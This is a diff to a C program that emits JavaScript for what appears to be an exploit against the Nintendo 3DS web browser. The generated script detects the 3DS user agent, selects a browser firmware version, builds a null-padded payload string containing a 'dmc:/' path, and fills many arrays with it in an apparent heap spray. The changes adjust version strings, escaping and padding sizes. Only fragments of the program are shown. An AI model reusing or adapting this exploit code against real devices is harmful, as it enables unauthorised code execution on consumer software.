@@ -27,10 +27,10 @@
 typedef uint_least16_t char16_t;
 #endif
 
-#define FIRM_VER_SIZE 6
+#define FIRM_VER_SIZE 7
 
 static const char firms[][FIRM_VER_SIZE] = {
-	"17412", "17455", "17498", "17552", "17567"
+	"1.7412", "1.7455", "1.7498", "1.7552", "1.7567"
 };
 
 int main(int argc, const char *argv[])
@@ -84,6 +84,7 @@ int main(int argc, const char *argv[])
 							"d.body.appendChild(o);"
 						"}"
 					"}"
+
 					"function z(){"
 						"n=navigator.userAgent;"
 						"if(n.indexOf('Nintendo 3DS')!=-1){"
@@ -108,6 +109,8 @@ int main(int argc, const char *argv[])
 				printf("\\0");
 			else if (c == '\'')
 				printf("\\'");
+			else if (c == '\\')
+				printf("\\\\");
 			else if (c < 0x80)
 				putchar((char)c);
 			else if (c < 0x800) {
@@ -125,8 +128,10 @@ int main(int argc, const char *argv[])
 		fclose(fp);
 	}
 
-	printf(						"}[n.substring(n.lastIndexOf('/')+1,n.lastIndexOf('.'))].replace(':','dmc:/'+l+Array(26-l.length).join('\\0'))+Array(74).join('\\0'),"
-							"s=q.length-1;"
+	printf(						"}[n.substring(n.lastIndexOf('/')+1,n.lastIndexOf('.'))]+'dmc:/'+l;"
+							"for(i=l.length;i<108;i++)"
+								"q+='\\0';"
+							"s=385;"
 							"for(j=1;j<410;j++){"
 								"i=4*j/s,a=Array(j);"
 								"for(k=0;k<i;a[k++]=q);"
